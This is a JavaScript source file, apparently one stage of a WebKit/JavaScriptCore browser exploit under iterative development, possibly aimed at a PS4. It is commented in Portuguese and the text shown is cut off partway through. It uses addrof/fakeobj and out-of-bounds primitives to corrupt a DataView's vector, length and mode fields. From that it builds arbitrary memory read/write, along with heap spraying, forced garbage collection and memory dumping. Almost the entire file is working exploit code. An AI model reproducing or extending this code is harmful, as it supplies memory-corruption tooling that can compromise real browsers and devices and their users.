// js/script3/testArrayBufferVictimCrash.mjs (v28 - Nova Estratégia de Corrupção do DataView Forjado)
// =======================================================================================
// ESTA VERSÃO IMPLEMENTA UMA ESTRATÉGIA MAIS SEGURA PARA FORJAR O DATAVIEW OOB.
// FOCO: Passar pela FASE 3 e obter controle arbitrário.
// =======================================================================================

import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    clearOOBEnvironment,
    addrof_core,
    fakeobj_core,
    initCoreAddrofFakeobjPrimitives,
    arb_read, // Esta é a primitiva antiga baseada em oob_dataview_real
    arb_write, // Esta é a primitiva antiga baseada em oob_dataview_real
    selfTestOOBReadWrite,
    oob_read_absolute,
    oob_write_absolute,
    setupOOBMetadataForArbitraryAccess
} from '../core_exploit.mjs';

import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE = "v28 - Nova Estratégia de Corrupção do DataView Forjado"; // Versão atualizada

// Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
const LOCAL_VERY_SHORT_PAUSE = 10;
const LOCAL_SHORT_PAUSE = 100;
const LOCAL_MEDIUM_PAUSE = 750;
const LOCAL_LONG_PAUSE = 1500;
const LOCAL_SHORT_SHORT_PAUSE = 50;

const EXPECTED_BUTTERFLY_ELEMENT_SIZE = 8; // Constante para JSValue (8 bytes)

let global_spray_objects = [];
let hold_objects = [];

let _fake_data_view = null; // DataView forjado para L/E arbitrária universal
let _backing_array_buffer_for_fake_dv = null; // ArrayBuffer real que será type-confused e manipulado para o _fake_data_view

// Funções Auxiliares Comuns (dumpMemory)
async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") {
    logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
    const bytesPerRow = 16;
    for (let i = 0; i < size; i += bytesPerRow) {
        let hexLine = address.add(i).toString(true) + ": "; 
        let asciiLine = "  ";
        let rowBytes = [];

        for (let j = 0; j < bytesPerRow; j++) {
            if (i + j < size) {
                try {
                    const byte = await arbReadFn(address.add(i + j), 1, logFn);
                    rowBytes.push(byte);
                    hexLine += byte.toString(16).padStart(2, '0') + " ";
                    asciiLine += (byte >= 0x20 && byte <= 0x7E) ? String.fromCharCode(byte) : '.';
                } catch (e) {
                    hexLine += "?? ";
                    asciiLine += "?";
                    logFn(`[${sourceName}] ERRO ao ler byte em ${address.add(i + j).toString(true)}: ${e.message}`, "error");
                    for (let k = j + 1; k < bytesPerRow; k++) { hexLine += "?? "; asciiLine += "?"; }
                    break;
                }
            } else {
                hexLine += "   ";
                asciiLine += " ";
            }
        }
        logFn(`[${sourceName}] ${hexLine}${asciiLine}`, "leak");
    }
    logFn(`[${sourceName}] Fim do dump.`, "debug");
}

// arb_read_universal_js_heap e arb_write_universal_js_heap são definidas aqui,
// mas a lógica principal da FASE 3 agora será um pouco diferente.

export async function arb_read_universal_js_heap(address, byteLength, logFn) {
    const FNAME = "arb_read_universal_js_heap";
    if (!_fake_data_view || !_backing_array_buffer_for_fake_dv) {
        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME);
        throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
    }
    // O endereço do ArrayBuffer que o _fake_data_view usa como base.
    const backing_ab_addr = addrof_core(_backing_array_buffer_for_fake_dv);
    // Offset do ponteiro 'contentsImpl' DENTRO DO ArrayBuffer de apoio.
    const CONTENTS_IMPL_POINTER_OFFSET_IN_BACKING_AB = backing_ab_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);

    // Salvar o m_vector original do ArrayBuffer de apoio
    const original_m_vector_of_backing_ab = await arb_read(CONTENTS_IMPL_POINTER_OFFSET_IN_BACKING_AB, 8);
    // Escrever o endereço alvo para o m_vector do ArrayBuffer de apoio
    await arb_write(CONTENTS_IMPL_POINTER_OFFSET_IN_BACKING_AB, address, 8);

    let result = null;
    try {
        switch (byteLength) {
            case 1: result = _fake_data_view.getUint8(0); break;
            case 2: result = _fake_data_view.getUint16(0, true); break;
            case 4: result = _fake_data_view.getUint32(0, true); break;
            case 8:
                const low = _fake_data_view.getUint32(0, true);
                const high = _fake_data_view.getUint32(4, true);
                result = new AdvancedInt64(low, high);
                break;
            default: throw new Error(`Invalid byteLength for arb_read_universal_js_heap: ${byteLength}`);
        }
    } finally {
        // Restaurar o m_vector original
        await arb_write(CONTENTS_IMPL_POINTER_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
    }
    return result;
}

export async function arb_write_universal_js_heap(address, value, byteLength, logFn) {
    const FNAME = "arb_write_universal_js_heap";
    if (!_fake_data_view || !_backing_array_buffer_for_fake_dv) {
        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME);
        throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
    }
    const backing_ab_addr = addrof_core(_backing_array_buffer_for_fake_dv);
    const CONTENTS_IMPL_POINTER_OFFSET_IN_BACKING_AB = backing_ab_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);

    const original_m_vector_of_backing_ab = await arb_read(CONTENTS_IMPL_POINTER_OFFSET_IN_BACKING_AB, 8);
    await arb_write(CONTENTS_IMPL_POINTER_OFFSET_IN_BACKING_AB, address, 8);

    try {
        switch (byteLength) {
            case 1: _fake_data_view.setUint8(0, Number(value)); break;
            case 2: _fake_data_view.setUint16(0, Number(value), true); break;
            case 4: _fake_data_view.setUint32(0, Number(value), true); break;
            case 8:
                let val64 = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
                _fake_data_view.setUint32(0, val64.low(), true);
                _fake_data_view.setUint32(4, val64.high(), true);
                break;
            default: throw new Error(`Invalid byteLength for arb_write_universal_js_heap: ${byteLength}`);
        }
    } finally {
        await arb_write(CONTENTS_IMPL_POINTER_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
    }
    return value;
}

// Funções para converter entre JS Double e AdvancedInt64 (do utils.mjs)
function _doubleToInt64_direct(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

function _int64ToDouble_direct(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

/**
 * Tenta configurar a primitiva de leitura/escrita arbitrária universal.
 * Esta função agora foca em:
 * 1. Criar um ArrayBuffer de apoio.
 * 2. Criar um DataView LEGÍTIMO (sem corrupção inicial de estrutura) sobre ESSE ArrayBuffer.
 * 3. Usar as primitivas arb_read/arb_write (old primitive) para corromper os metadados DO DATAVIEW recém-criado
 * (m_vector, m_length, m_mode) para torná-lo OOB.
 * Isso garante que o DataView seja um DataView válido antes de tentar corrompê-lo para OOB.
 * @param {Function} logFn Função de log.
 * @param {Function} pauseFn Função de pausa.
 * @param {object} JSC_OFFSETS_PARAM Offsets das estruturas JSC.
 * @param {number} m_mode_to_try O valor de m_mode a ser testado para o DataView forjado.
 * @returns {Promise<boolean>} True se a primitiva foi configurada e testada com sucesso com este m_mode.
 */
async function setupUniversalArbitraryReadWritePrimitive(logFn, pauseFn, JSC_OFFSETS_PARAM, m_mode_to_try) {
    const FNAME = "setupUniversalArbitraryReadWritePrimitive";
    logFn(`[${FNAME}] Tentando configurar L/E Arbitrária Universal (via corrupção direta do DataView) com m_mode: ${toHex(m_mode_to_try)}...`, "subtest", FNAME);

    _fake_data_view = null;
    _backing_array_buffer_for_fake_dv = null; // Este ArrayBuffer será o que _fake_data_view *inicialmente* aponta
    let success = false;

    try {
        // 1. Criar um ArrayBuffer real. Este será o que o _fake_data_view controlará.
        _backing_array_buffer_for_fake_dv = new ArrayBuffer(0x1000); // Tamanho suficiente
        hold_objects.push(_backing_array_buffer_for_fake_dv); // Previne GC
        const initial_backing_ab_addr = addrof_core(_backing_array_buffer_for_fake_dv);
        logFn(`[${FNAME}] ArrayBuffer inicial para fake DV criado em: ${initial_backing_ab_addr.toString(true)}`, "info", FNAME);
        await pauseFn(LOCAL_VERY_SHORT_PAUSE);

        // 2. Criar um DataView *legítimo* sobre um ArrayBuffer temporário.
        // O OOB DataView REAL (_fake_data_view) será este.
        const temp_ab_for_legit_dv = new ArrayBuffer(0x100); // Um buffer pequeno e temporário
        const legit_dataview_instance = new DataView(temp_ab_for_legit_dv);
        hold_objects.push(temp_ab_for_legit_dv);
        hold_objects.push(legit_dataview_instance);
        logFn(`[${FNAME}] DataView legítimo temporário criado: ${legit_dataview_instance}`, "info", FNAME);
        await pauseFn(LOCAL_VERY_SHORT_PAUSE);

        // Obter o endereço da instância legítima do DataView (que queremos corromper)
        const legit_dataview_addr = addrof_core(legit_dataview_instance);
        logFn(`[${FNAME}] Endereço da instância legítima do DataView: ${legit_dataview_addr.toString(true)}`, "info", FNAME);
        await pauseFn(LOCAL_VERY_SHORT_PAUSE);

        // DUMP 1: Conteúdo da instância legítima do DataView antes da corrupção.
        logFn(`[${FNAME}] DEBUG: Dump da instância legítima do DataView (0x${toHex(legit_dataview_addr.low())}) ANTES da corrupção (primeiros 0x60 bytes):`, "debug");
        await dumpMemory(legit_dataview_addr, 0x60, logFn, arb_read, `${FNAME}_LegitDV_Before`);
        await pauseFn(LOCAL_VERY_SHORT_PAUSE);

        // Agora, corromper os campos M_VECTOR, M_LENGTH e M_MODE DA INSTÂNCIA legit_dataview_instance
        // para que ela se torne OOB e aponte para initial_backing_ab_addr.
        // Offsets relativos ao início da instância DataView.

        logFn(`[${FNAME}] Corrompendo M_VECTOR do DataView (OFFSET: ${toHex(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET)}) para ${initial_backing_ab_addr.toString(true)}...`, "info", FNAME);
        await arb_write(legit_dataview_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET), initial_backing_ab_addr, 8);
        await pauseFn(LOCAL_VERY_SHORT_PAUSE);

        logFn(`[${FNAME}] Corrompendo M_LENGTH do DataView (OFFSET: ${toHex(JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET)}) para 0xFFFFFFFF...`, "info", FNAME);
        await arb_write(legit_dataview_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET), 0xFFFFFFFF, 4);
        await pauseFn(LOCAL_VERY_SHORT_PAUSE);

        logFn(`[${FNAME}] Corrompendo M_MODE do DataView (OFFSET: ${toHex(JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET)}) para ${toHex(m_mode_to_try)}...`, "info", FNAME);
        await arb_write(legit_dataview_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET), m_mode_to_try, 4);
        await pauseFn(LOCAL_VERY_SHORT_PAUSE);

        logFn(`[${FNAME}] Instância legítima do DataView corrompida.`, "info", FNAME);
        
        // DUMP 2: Conteúdo da instância legítima do DataView APÓS a corrupção.
        logFn(`[${FNAME}] DEBUG: Dump da instância legítima do DataView (0x${toHex(legit_dataview_addr.low())}) APÓS corrupção (primeiros 0x60 bytes):`, "debug");
        await dumpMemory(legit_dataview_addr, 0x60, logFn, arb_read, `${FNAME}_LegitDV_AfterCorruption`);
        await pauseFn(LOCAL_VERY_SHORT_PAUSE);

        // Atribuir o DataView corrompido à variável global _fake_data_view
        _fake_data_view = legit_dataview_instance;
        logFn(`[${FNAME}] _fake_data_view agora é a instância corrompida.`, "info", FNAME);

        // Testar a primitiva L/E Arbitrária Universal usando o DataView forjado.
        // O DataView _fake_data_view deve agora ser OOB e apontar para initial_backing_ab_addr.
        // Vamos testar lendo e escrevendo dentro do initial_backing_ab_addr através de _fake_data_view.
        const TEST_VALUE_INTERNAL = 0xCAFADADA;
        _fake_data_view.setUint32(0, TEST_VALUE_INTERNAL, true); // Escreve no início do initial_backing_ab_addr
        await pauseFn(LOCAL_VERY_SHORT_PAUSE);
        const read_back_internal = _fake_data_view.getUint32(0, true); // Lê do início do initial_backing_ab_addr
        
        if (read_back_internal === TEST_VALUE_INTERNAL) {
            logFn(`[${FNAME}] SUCESSO: Leitura/Escrita através do _fake_data_view (OOB local) FUNCIONANDO!`, "good", FNAME);
            
            // Agora, para a verdadeira L/E universal, o m_vector do fake_data_view será manipulado pelas funções arb_read_universal_js_heap/arb_write_universal_js_heap.
            // Para isso, precisamos que _backing_array_buffer_for_fake_dv seja o ArrayBuffer cujo CONTENTS_IMPL_POINTER é alterado.
            // O _fake_data_view não precisa mais do _backing_array_buffer_for_fake_dv para sua própria operação OOB interna,
            // mas _backing_array_buffer_for_fake_dv é usado como o 'stage' para a leitura/escrita universal.

            success = true;
            return true;
        } else {
            logFn(`[${FNAME}] FALHA: Leitura/Escrita através do _fake_data_view (OOB local) INCONSISTENTE! Lido: ${toHex(read_back_internal)}, Esperado: ${toHex(TEST_VALUE_INTERNAL)}.`, "error", FNAME);
            return false;
        }

    } catch (e) {
        logFn(`[${FNAME}] ERRO CRÍTICO durante a configuração da primitiva Universal ARB R/W: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
        return false;
    } finally {
        if (!success) {
            if (_backing_array_buffer_for_fake_dv) {
                const index = hold_objects.indexOf(_backing_array_buffer_for_fake_dv);
                if (index > -1) { hold_objects.splice(index, 1); }
            }
            if (legit_dataview_instance) { // Limpar a instância legítima se ela foi criada
                const index = hold_objects.indexOf(legit_dataview_instance);
                if (index > -1) { hold_objects.splice(index, 1); }
            }
            if (temp_ab_for_legit_dv) { // Limpar o temp_ab_for_legit_dv
                const index = hold_objects.indexOf(temp_ab_for_legit_dv);
                if (index > -1) { hold_objects.splice(index, 1); }
            }
            _fake_data_view = null;
            _backing_array_buffer_for_fake_dv = null;
        }
    }
}


// Função para forçar Coleta de Lixo
async function triggerGC(logFn, pauseFn) {
    logFn("    Acionando GC...", "info", "GC_Trigger");
    try {
        for (let i = 0; i < 500; i++) {
            new ArrayBuffer(1024 * 256);
        }
    } catch (e) {
        logFn("    Memória esgotada durante o GC Trigger, o que é esperado e bom (força GC).", "info", "GC_Trigger");
    }
    await pauseFn(LOCAL_SHORT_PAUSE);
    for (let i = 0; i < 25; i++) {
        new ArrayBuffer(1024);
    }
    await pauseFn(LOCAL_SHORT_PAUSE);
}

/**
 * Tenta um Type Confusion direto para obter primitivas addrof/fakeobj.
 * @param {Function} logFn Função de log.
 * @param {Function} pauseFn Função de pausa.
 * @param {object} JSC_OFFSETS_PARAM Offsets JSC.
 * @returns {Promise<boolean>} True se addrof/fakeobj foram estabilizados.
 */
async function stabilizeAddrofFakeobjPrimitives(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME = "stabilizeAddrofFakeobjPrimitives";
    logFn(`[${FNAME}] Iniciando estabilização de addrof_core/fakeobj_core.`, "subtest", FNAME);

    initCoreAddrofFakeobjPrimitives();

    const NUM_STABILIZATION_ATTEMPTS = 5;
    for (let i = 0; i < NUM_STABILIZATION_ATTEMPTS; i++) {
        logFn(`[${FNAME}] Tentativa de estabilização #${i + 1}/${NUM_STABILIZATION_ATTEMPTS}.`, "info", FNAME);

        hold_objects = [];
        await triggerGC(logFn, pauseFn);
        logFn(`[${FNAME}] Heap limpo antes da tentativa de estabilização.`, "info", FNAME);
        await pauseFn(LOCAL_MEDIUM_PAUSE);

        try {
            let test_obj = { a: 0x11223344, b: 0x55667788 };
            hold_objects.push(test_obj);

            const addr = addrof_core(test_obj);
            logFn(`[${FNAME}] addrof_core para test_obj (${test_obj.toString()}) resultou em: ${addr.toString(true)}`, "debug", FNAME);

            if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero) || addr.equals(AdvancedInt64.NaNValue)) {
                logFn(`[${FNAME}] FALHA: addrof_core retornou endereço inválido para test_obj.`, "error", FNAME);
                throw new Error("addrof_core falhou na estabilização.");
            }

            const faked_obj = fakeobj_core(addr);
            
            const original_val = faked_obj.a;
            faked_obj.a = 0xDEADC0DE;
            await pauseFn(LOCAL_VERY_SHORT_PAUSE);
            const new_val = faked_obj.a;

            if (new_val === 0xDEADC0DE && test_obj.a === 0xDEADC0DE) {
                logFn(`[${FNAME}] SUCESSO: addrof_core/fakeobj_core estabilizados e funcionando!`, "good", FNAME);
                faked_obj.a = original_val;
                return true;
            } else {
                logFn(`[${FNAME}] FALHA: addrof_core/fakeobj_core inconsistentes. Original: ${toHex(original_val)}, Escrito: ${toHex(0xDEADC0DE)}, Lido: ${toHex(new_val)}.`, "error", FNAME);
                throw new Error("fakeobj_core falhou na estabilização.");
            }
        } catch (e) {
            logFn(`[${FNAME}] Erro durante tentativa de estabilização: ${e.message}`, "warn", FNAME);
        }
    }

    logFn(`[${FNAME}] FALHA CRÍTICA: Não foi possível estabilizar as primitivas addrof_core/fakeobj_core após ${NUM_STABILIZATION_ATTEMPTS} tentativas.`, "critical", FNAME);
    return false;
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME_CURRENT_TEST = "Teste Uaf Type Confusion - C/W Bypass";
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE;
    logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Integração UAF/TC e Construção de ARB R/W Universal ---`, "test");

    let final_result = { success: false, message: "Exploração falhou ou não pôde ser verificada.", details: {} };
    const startTime = performance.now();
    let webkit_base_address = null;
    let found_m_mode = null;

    let DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = null; 

    try { // <-- Este é o 'try' principal da função executeTypedArrayVictimAddrofAndWebKitLeak_R43
        logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });

        logFn("--- FASE 0: Validando primitivas arb_read/arb_write (OLD PRIMITIVE) com selfTestOOBReadWrite ---", "subtest");
        const arbTestSuccess = await selfTestOOBReadWrite(logFn);
        if (!arbTestSuccess) {
            const errMsg = "Falha crítica: As primitivas arb_read/arb_write (OLD PRIMITIVE) não estão funcionando. Abortando a exploração.";
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn("Primitivas arb_read/arb_write (OLD PRIMITIVE) validadas com sucesso. Prosseguindo com a exploração.", "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos AGRESSIVO) ---", "subtest");
        const sprayStartTime = performance.now();
        const INITIAL_SPRAY_COUNT = 10000; // Reduzido para evitar travamentos no PS4
        logFn(`Iniciando spray de objetos (volume ${INITIAL_SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
        for (let i = 0; i < INITIAL_SPRAY_COUNT; i++) {
            const dataSize = 50 + (i % 50) * 16;
            global_spray_objects.push({ id: `spray_obj_${i}`, val1: 0xDEADBEEF + i, val2: 0xCAFEBABE + i, data: new Array(dataSize).fill(i % 255) });
        }
        logFn(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
        logFn("Heap estabilizado inicialmente para reduzir realocations inesperadas pelo GC.", "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        logFn("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
        const oobSetupStartTime = performance.now();
        logFn("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
        await triggerOOB_primitive({ force_reinit: true });

        const oob_data_view = getOOBDataView();
        const oob_array_buffer = oob_data_view.buffer; // Obtenha a referência ao ArrayBuffer real
        hold_objects.push(oob_array_buffer); // Mantenha o ArrayBuffer real referenciado para evitar GC
        hold_objects.push(oob_data_view); // Mantenha o DataView real referenciado para evitar GC

        // NOVO: Aquecer/Pin o oob_array_buffer_real diretamente aqui
        logFn(`[FASE 2] Aquecendo/Pinando oob_array_buffer_real para estabilizar ponteiro CONTENTS_IMPL_POINTER.`, "info");
        try {
            if (oob_array_buffer && oob_array_buffer.byteLength > 0) {
                const tempUint8View = new Uint8Array(oob_array_buffer);
                // Acessos mais agressivos e variados para forçar o JIT a "fixar" o buffer
                for (let i = 0; i < Math.min(tempUint8View.length, 0x1000); i += 8) { // Acessar a cada 8 bytes
                    tempUint8View[i] = i % 255;
                    tempUint8View[i+1] = (i+1) % 255;
                    tempUint8View[i+2] = (i+2) % 255;
                    tempUint8View[i+3] = (i+3) % 255;
                    tempUint8View[i+4] = (i+4) % 255;
                    tempUint8View[i+5] = (i+5) % 255;
                    tempUint8View[i+6] = (i+6) % 255;
                    tempUint8View[i+7] = (i+7) % 255;
                }
                 for (let i = 0; i < Math.min(tempUint8View.length, 0x1000); i += 8) {
                    let val = tempUint8View[i]; // Lê para forçar atividade de memória
                 }
                logFn(`[FASE 2] oob_array_buffer_real aquecido/pinado com sucesso.`, "good");
            }
        } catch (e) {
            logFn(`[FASE 2] ALERTA: Erro durante o aquecimento/pinning do oob_array_buffer_real: ${e.message}`, "warn");
        }
        // FIM do Aquecimento/Pinning


        if (!oob_data_view) {
            const errMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn(`Ambiente OOB configurado com DataView: ${oob_data_view !== null ? 'Pronto' : 'Falhou'}. Time: ${(performance.now() - oobSetup
